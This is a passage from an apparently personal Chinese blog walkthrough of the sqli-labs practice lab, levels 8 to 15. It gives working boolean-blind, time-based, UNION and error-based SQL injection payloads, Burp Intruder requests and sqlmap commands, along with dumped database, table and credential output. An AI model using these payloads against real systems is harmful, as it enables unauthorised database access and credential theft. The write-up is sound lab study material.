上传文件，上传成功，上蚁剑连接</p>\n<p>换个思路，上盲注，看题目是布尔盲注，一个一个猜呗，机智的我决定先测试出长度再上 bp 爆</p>\n<p>length () 函数，显而易见是返回里面参数的长度</p>\n<p>substr (a,b,c) 函数，显而易见是截断字符串 a，b 位置开始截取 c 个字符</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-8?id=1&#x27; and (select length(database()))=8 %23+</span><br></pre></td></tr></table></figure>\n<p>=8 时正常输出，说明当前数据库名字长度为 8</p>\n<p>上 bp, 选中 Intruder</p>\n<p>攻击模式可以选 sniper 也可以选 clusterbomb，都很方便，字典直接用 excel 下拉到 127 的…，一个一个打也太费劲了把</p>\n<p>从 1 到 127 一个一个猜数据库名中的字符，根据返回数据的长度不同找到正确的 ascii 码值：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /Less-8/?id=1%27%20and%20(select%20ascii(substr(database(),§1§,1)))=§115§%20%23+ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateDNT: 1Connection: keep-aliveUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cache</span><br></pre></td></tr></table></figure>\n<p>这里就不上 bp 图了，不好搞，用的笛卡尔乘积，发了一千多个请求就爆了个当前数据库名，要爆别的在上面 payload 改改完事：</p>\n<table>\n<thead>\n<tr>\n<th>request</th>\n<th>payload1</th>\n<th>payload2</th>\n<th>status</th>\n<th>timeout</th>\n<th>error</th>\n<th>length</th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0</td>\n<td></td>\n<td></td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>950</td>\n<td></td>\n</tr>\n<tr>\n<td>787</td>\n<td>3</td>\n<td>99</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>950</td>\n<td></td>\n</tr>\n<tr>\n<td>802</td>\n<td>2</td>\n<td>101</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>950</td>\n<td></td>\n</tr>\n<tr>\n<td>838</td>\n<td>6</td>\n<td>105</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>950</td>\n<td></td>\n</tr>\n<tr>\n<td>909</td>\n<td>5</td>\n<td>114</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>950</td>\n<td></td>\n</tr>\n<tr>\n<td>913</td>\n<td>1</td>\n<td>115</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>950</td>\n<td></td>\n</tr>\n<tr>\n<td>927</td>\n<td>7</td>\n<td>116</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>950</td>\n<td></td>\n</tr>\n<tr>\n<td>932</td>\n<td>4</td>\n<td>117</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>950</td>\n<td></td>\n</tr>\n<tr>\n<td>968</td>\n<td>8</td>\n<td>121</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>950</td>\n<td></td>\n</tr>\n<tr>\n<td>1</td>\n<td>1</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>966</td>\n<td></td>\n</tr>\n<tr>\n<td>2</td>\n<td>2</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>966</td>\n<td></td>\n</tr>\n<tr>\n<td>3</td>\n<td>3</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>966</td>\n<td></td>\n</tr>\n<tr>\n<td>4</td>\n<td>4</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>966</td>\n<td></td>\n</tr>\n<tr>\n<td>5</td>\n<td>5</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>966</td>\n<td></td>\n</tr>\n<tr>\n<td>6</td>\n<td>6</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>966</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"总结-8\"><a class=\"markdownIt-Anchor\" href=\"#总结-8\">#</a> 总结</h2>\n<p>盲注一个个手打的话就是很费时间，疲惫</p>\n<p>有 sqlmap 真好</p>\n<hr>\n<h1 id=\"less-9\"><a class=\"markdownIt-Anchor\" href=\"#less-9\">#</a> Less-9</h1>\n<p>date：2020-11-21 15:10:01</p>\n<h2 id=\"过程-9\"><a class=\"markdownIt-Anchor\" href=\"#过程-9\">#</a> 过程</h2>\n<h3 id=\"sqlmap-9\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-9\">#</a> sqlmap</h3>\n<p>同 less-1</p>\n<h3 id=\"手工注入-9\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-9\">#</a> 手工注入</h3>\n<p>不管输入什么都是正常输出，明明输入的 id 数据库里面就没有，还说 you are in，用户体验差评：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Welcome    DhakkanYou are in...........</span><br></pre></td></tr></table></figure>\n<p>利用 if () 函数进行时间盲注，发现闭合单引号的时候它就一直睡觉咯</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-9?id=1&#x27; and if((1=2),1,sleep(2333)) %23</span><br></pre></td></tr></table></figure>\n<p>和布尔盲注类似，但是是根据服务器响应的时间长短进行判断了，开干</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-9?id=1&#x27; and if((length(database())=8),sleep(2333),1) %23</span><br></pre></td></tr></table></figure>\n<p>判断出 database () 的长度是 8 个字符，还是接着上 bp：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /Less-9/?id=1%27%20and%20if((ascii(substr(database(),§1§,1))=§115§),sleep(11),1)%20%23 HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateDNT: 1Connection: keep-aliveUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cache</span><br></pre></td></tr></table></figure>\n<p>bp 的 result，根据 ascii 值就可以吧当前数据名弄出来了：</p>\n<table>\n<thead>\n<tr>\n<th>request</th>\n<th>payload1</th>\n<th>payload2</th>\n<th>status</th>\n<th>timeout</th>\n<th>error</th>\n<th>length</th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0</td>\n<td></td>\n<td></td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>988</td>\n<td></td>\n</tr>\n<tr>\n<td>787</td>\n<td>3</td>\n<td>99</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>988</td>\n<td></td>\n</tr>\n<tr>\n<td>802</td>\n<td>2</td>\n<td>101</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>988</td>\n<td></td>\n</tr>\n<tr>\n<td>838</td>\n<td>6</td>\n<td>105</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>988</td>\n<td></td>\n</tr>\n<tr>\n<td>909</td>\n<td>5</td>\n<td>114</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>988</td>\n<td></td>\n</tr>\n<tr>\n<td>913</td>\n<td>1</td>\n<td>115</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>988</td>\n<td></td>\n</tr>\n<tr>\n<td>927</td>\n<td>7</td>\n<td>116</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>988</td>\n<td></td>\n</tr>\n<tr>\n<td>932</td>\n<td>4</td>\n<td>117</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>988</td>\n<td></td>\n</tr>\n<tr>\n<td>968</td>\n<td>8</td>\n<td>121</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>988</td>\n<td></td>\n</tr>\n<tr>\n<td>1</td>\n<td>1</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>951</td>\n<td></td>\n</tr>\n<tr>\n<td>2</td>\n<td>2</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>951</td>\n<td></td>\n</tr>\n<tr>\n<td>3</td>\n<td>3</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>951</td>\n<td></td>\n</tr>\n<tr>\n<td>4</td>\n<td>4</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>951</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"总结-9\"><a class=\"markdownIt-Anchor\" href=\"#总结-9\">#</a> 总结</h2>\n<p>其实想节省时间可以去看数据库的命名规范，确定要测试的字符有哪些，这样在进行大量数据测试的时候会节省一些时间</p>\n<hr>\n<h1 id=\"less-10\"><a class=\"markdownIt-Anchor\" href=\"#less-10\">#</a> Less-10</h1>\n<p>date：2020-11-21 15:55:10</p>\n<h2 id=\"过程-10\"><a class=\"markdownIt-Anchor\" href=\"#过程-10\">#</a> 过程</h2>\n<h3 id=\"sqlmap-10\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-10\">#</a> sqlmap</h3>\n<p>同 less-1</p>\n<h3 id=\"手工注入-10\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-10\">#</a> 手工注入</h3>\n<p>和 less-9 相比就是单引号闭合变成了双引号闭合</p>\n<p>用这个 payload，服务器就睡觉啦：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-10?id=1&quot; and if((1=1),sleep(2333),1) %23+</span><br></pre></td></tr></table></figure>\n<p>后面的流程和 less-9 一样</p>\n<h2 id=\"总结-10\"><a class=\"markdownIt-Anchor\" href=\"#总结-10\">#</a> 总结</h2>\n<p>遇到这个题目也不知道是该开心还是该开心</p>\n<hr>\n<h1 id=\"less-11\"><a class=\"markdownIt-Anchor\" href=\"#less-11\">#</a> Less-11</h1>\n<p>date：2020-11-21 16:23:25</p>\n<h2 id=\"过程-11\"><a class=\"markdownIt-Anchor\" href=\"#过程-11\">#</a> 过程</h2>\n<p>写完时间盲注的我，看见这道题目，眼前一亮！终于换题目啦哈哈哈哈哈哈哈嗝</p>\n<h3 id=\"sqlmap-11\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-11\">#</a> sqlmap</h3>\n<p>sqlmap 测 post 请求可以用参数 forms</p>\n<p>这里用的–forms 参数，直接搞到所有数据库了：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">py sqlmap.py -u http://www.sqli-labs.com/Less-11 --forms --dbs --batch</span><br></pre></td></tr></table></figure>\n<p>后面爆字段值改参数就可以了，同 less-1</p>\n<h3 id=\"手工注入-11\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-11\">#</a> 手工注入</h3>\n<p>看见登录框就想 admin/123456 登录（竟然失败了！气人！）</p>\n<p>抓包看见的是 post 请求，所以不能和之前一样直接在 url 后面接参数了，那就在输入框直接注入哈哈哈</p>\n<p>payload，username 最后面有个空格，不加空格注释符号和后面的符号连接在一起，就起不到注释的功能啦:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Username :    admin&#x27; or 1=1 -- Password :    123456</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Your Login name:DumbYour Password:Dumb</span><br></pre></td></tr></table></figure>\n<p>有数据回显，舒服了</p>\n<p>上 bp 抓包，直接改后面的参数，根据 order by 确定需要两个字段：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /Less-11/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-11/Content-Type: application/x-www-form-urlencodedContent-Length: 51Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheuname=admin%27 order by 2+--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出，竟然真的有一个 admin/admin…：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;br&gt;Your Login name:admin&lt;br&gt;Your Password:admin&lt;br&gt;</span><br></pre></td></tr></table></figure>\n<p>爆数据库 payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=zhatian%27 union select 1,group_concat(schema_name) from information_schema.schemata+--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;br&gt;Your Login name:1&lt;br&gt;Your Password:information_schema,bookstore,challenges,dvwa,edusys,exam,fresh,hotel,hy,hy2,mysql,news,pentest,performance_schema,pikachu,security,store,student,test,vote&lt;br&gt;</span><br></pre></td></tr></table></figure>\n<p>爆表 payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=zhatian%27 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()+--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;br&gt;Your Login name:1&lt;br&gt;Your Password:emails,referers,uagents,users&lt;br</span><br></pre></td></tr></table></figure>\n<p>爆字段:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=zhatian%27 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;+--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;br&gt;Your Login name:1&lt;br&gt;Your Password:user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,level,id,username,password&lt;br&gt;</span><br></pre></td></tr></table></figure>\n<p>爆字段值:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=zhatian%27 union select 1,group_concat(concat_ws(&#x27;--&#x27;,username,password)) from users +--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;br&gt;Your Login name:1&lt;br&gt;Your Password:Dumb--Dumb,Angelina--I-kill-you,Dummy--p@ssword,secure--crappy,stupid--stupidity,superman--genious,batman--mob!le,admin--admin,admin1--admin1,admin2--admin2,admin3--admin3,dhakkan--dumbo,admin4--admin4&lt;br</span><br></pre></td></tr></table></figure>\n<p>后面的都是常规操作了</p>\n<h2 id=\"总结-11\"><a class=\"markdownIt-Anchor\" href=\"#总结-11\">#</a> 总结</h2>\n<p>sqlmap 测 post 请求可以用参数 forms，直接获取表单，可以使用 - r 参数读取请求文件，或者通过–data 参数测试，具体情况具体百度</p>\n<p>-r 读取的文件可以用 bp 抓包，右键 copy to file，直接导出 txt 文件</p>\n<hr>\n<h1 id=\"less-12\"><a class=\"markdownIt-Anchor\" href=\"#less-12\">#</a> Less-12</h1>\n<h2 id=\"过程-12\"><a class=\"markdownIt-Anchor\" href=\"#过程-12\">#</a> 过程</h2>\n<p>date：2020-11-21 17:21:22</p>\n<h3 id=\"sqlmap-12\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-12\">#</a> sqlmap</h3>\n<p>同 less-11</p>\n<h3 id=\"手工注入-12\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-12\">#</a> 手工注入</h3>\n<p>上 bp 抓包</p>\n<p>发现双引号报错，payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin&quot;+or+1%3D1+--+&amp;passwd=1234&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>我？？？</p>\n<p>生气的乱搞了:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin&quot;5678+or+1%3D1+--+&amp;passwd=1234&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;5678 or 1=1 -- &quot;) and password=(&quot;1234&quot;) LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>这下出来了把，后面是 &quot;)，再加个括号闭合一下下，分别 order by2 和 3，确定是两个字段</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin123455&quot;)+order by 3--+&amp;passwd=1234&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出当前数据库～</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin123455&quot;)+union select 1,database()--+&amp;passwd=1234&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;br&gt;Your Login name:1&lt;br&gt;Your Password:security&lt;br&gt;</span><br></pre></td></tr></table></figure>\n<p>后续操作参考 less-11</p>\n<h2 id=\"总结-12\"><a class=\"markdownIt-Anchor\" href=\"#总结-12\">#</a> 总结</h2>\n<p>和上一关比就是单引号闭合变成 &quot;) 闭合了，和前面十关做的题目一样呀，后面不会还是一样的吧，然后写完盲注就没了把</p>\n<p>唉，我觉得我的专注力有点不太够，才写了几道题啊，还花了这么长时间，真是废物</p>\n<hr>\n<h1 id=\"less-13\"><a class=\"markdownIt-Anchor\" href=\"#less-13\">#</a> Less-13</h1>\n<p>date：2020-11-21 18:08:01</p>\n<h2 id=\"过程-13\"><a class=\"markdownIt-Anchor\" href=\"#过程-13\">#</a> 过程</h2>\n<h3 id=\"sqlmap-13\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-13\">#</a> sqlmap</h3>\n<p>同 less-11</p>\n<h3 id=\"手工注入-13\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-13\">#</a> 手工注入</h3>\n<p>盲猜这题是 ')) 闭合，payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin%27%29%29+or+1%3D1+--+23&amp;passwd=32&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;) or 1=1 -- 23&#x27;) and password=(&#x27;32&#x27;) LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>哦豁，是 ') 闭合，生气！闭合：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin&#x27;) or 1=1+--+23&amp;passwd=32&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出只有一张图片，表示闭合成功，没有数据回显</p>\n<p>那就用报错来看数据呗，正好报错注入的函数我用的少</p>\n<p>extractvalue (目标 xml 文档，xml 路径) 用于查询 xml 文件</p>\n<p>第二个参数 xml 中的位置是可操作的地方，xml 文档中查找字符位置是用 /xxx/xxx/xxx/… 这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容</p>\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin&#x27;) and extractvalue(1,concat(&#x27;~&#x27;,database()))+--+23&amp;passwd=32&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出得到当前数据库名：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">XPATH syntax error: &#x27;~security</span><br></pre></td></tr></table></figure>\n<p>拿别的数据在 xml 路径那里改 payload 即可，参考 less-11</p>\n<h2 id=\"总结-13\"><a class=\"markdownIt-Anchor\" href=\"#总结-13\">#</a> 总结</h2>\n<p><a href=\"https://www.cnblogs.com/wocalieshenmegui/p/5917967.html\">十种 sql 报错注入姿势总结</a></p>\n<hr>\n<h1 id=\"less-14\"><a class=\"markdownIt-Anchor\" href=\"#less-14\">#</a> Less-14</h1>\n<p>date：2020-11-21 19:47:21</p>\n<h2 id=\"过程-14\"><a class=\"markdownIt-Anchor\" href=\"#过程-14\">#</a> 过程</h2>\n<h3 id=\"sqlmap-14\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-14\">#</a> sqlmap</h3>\n<p>同 less-11</p>\n<h3 id=\"手工注入-14\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-14\">#</a> 手工注入</h3>\n<p>直接双引号闭合了，payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin&quot; order by 666+--+&amp;passwd=123&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Unknown column &#x27;666&#x27; in &#x27;order clause&#x27;</span><br></pre></td></tr></table></figure>\n<p>能闭合了就随便用之前的哪个方法拿数据都可以啦，用报错注入拿个数据库名：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin&quot; and extractvalue(1,concat(&#x27;~&#x27;,database()))+--+&amp;passwd=123&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">XPATH syntax error: &#x27;~security&#x27;</span><br></pre></td></tr></table></figure>\n<p>别的同 Less-11</p>\n<h2 id=\"总结-14\"><a class=\"markdownIt-Anchor\" href=\"#总结-14\">#</a> 总结</h2>\n<p>这，没啥</p>\n<hr>\n<h1 id=\"less-15\"><a class=\"markdownIt-Anchor\" href=\"#less-15\">#</a> Less-15</h1>\n<p>date：2020-11-21 20:03:27</p>\n<h2 id=\"过程-15\"><a class=\"markdownIt-Anchor\" href=\"#过程-15\">#</a> 过程</h2>\n<h3 id=\"sqlmap-15\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-15\">#</a> sqlmap</h3>\n<p>同 less-11</p>\n<h3 id=\"手工注入-15\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-15\">#</a> 手工注入</h3>\n<p>看标题，布尔盲注，行叭，上 bp 抓包</p>\n<p>单引号闭合后接 order by 2，给的是 flag.jpg</p>\n<p>接 order by 2，给的是 slap.jpg</p>\n<p>明显 flag.jpg 的就是登陆成功嘛</p>\n<p>说明单引号闭合成功且需要的是两个字段：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin&#x27; order by 3+--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>还是先利用 if 判断，把数据库名字长度搞出来，利用一下 payload，服务器沉睡了好一会才醒来，那么长度就是 8 啦！</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin&#x27; and if( length(database())=8,sleep(23),1 )+--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>一个一个字符猜，这种搬砖的活还是交给 bp 把</p>\n<p>右键 send to Intruder，attack type 选 cluster bomb:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /Less-15/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-15/Content-Type: application/x-www-form-urlencodedContent-Length: 81Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheuname=admin&#x27; and if( ascii(substr(database(),§1§,1))=§8§,sleep(23),1 )+--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>第一个参数从 1-8，第二个参数从 1-127，最后根据 ascii 值把数据库名拖出来，爆字段参考 less-11</p>\n<table>\n<thead>\n<tr>\n<th>request</th>\n<th>payload1</th>\n<th>payload2</th>\n<th>status</th>\n<th>timeout</th>\n<th>error</th>\n<th>length</th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>787</td>\n<td>3</td>\n<td>99</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1691</td>\n<td></td>\n</tr>\n<tr>\n<td>802</td>\n<td>2</td>\n<td>101</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1691</td>\n<td></td>\n</tr>\n<tr>\n<td>838</td>\n<td>6</td>\n<td>105</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1691</td>\n<td></td>\n</tr>\n<tr>\n<td>909</td>\n<td>5</td>\n<td>114</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1691</td>\n<td></td>\n</tr>\n<tr>\n<td>913</td>\n<td>1</td>\n<td>115</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1691</td>\n<td></td>\n</tr>\n<tr>\n<td>927</td>\n<td>7</td>\n<td>116</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1691</td>\n<td></td>\n</tr>\n<tr>